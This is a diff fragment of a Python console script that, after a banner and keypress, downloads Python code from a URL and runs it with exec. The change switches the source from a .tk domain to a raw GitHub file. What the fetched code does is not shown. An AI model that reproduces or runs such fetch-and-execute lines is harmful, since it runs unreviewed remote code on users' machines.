@@ -35,4 +35,4 @@ while True:
     os.system('cls')
     banner()
     msvcrt.getch()
-    exec(requests.get('https://mccfiles.levv.tk/main.py').text)
+    exec(requests.get('https://raw.githubusercontent.com/QuangDayyy/MC/main/main.py').text)
